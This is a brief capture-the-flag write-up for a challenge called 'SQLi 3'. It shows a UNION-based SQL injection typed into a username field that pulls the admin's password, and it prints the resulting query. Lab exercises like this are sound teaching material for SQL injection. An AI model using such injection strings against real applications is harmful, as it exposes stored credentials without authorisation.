# SQLi 3

Observing the server code we get to know that the password of the admin is the flag.

Query: admin" UNION SELECT password FROM users WHERE username LIKE "admin

SQL Query formed:

```sql
SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username LIKE "admin"
```
